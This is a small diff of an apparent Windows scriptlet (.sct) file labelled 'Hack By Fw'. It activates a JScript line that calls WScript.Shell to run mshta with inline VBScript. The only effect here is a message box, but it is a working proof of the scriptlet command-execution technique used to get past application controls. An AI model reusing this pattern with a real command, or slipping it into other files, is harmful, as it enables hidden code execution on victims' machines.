@@ -4,7 +4,7 @@
 <!-- Hack By Fw -->
 <script language="JScript">
 	<![CDATA[    
-	  //  var r = new ActiveXObject("WScript.Shell").Run("mshta vbscript:msgbox(\"Hack By Fw\",64,\"I am Hacker\")(window.close)")
+	    var r = new ActiveXObject("WScript.Shell").Run("mshta vbscript:msgbox(\"hello man\",64,\"are you ok now ?\")(window.close)")
 	]]>    
 </script>
 </registration>
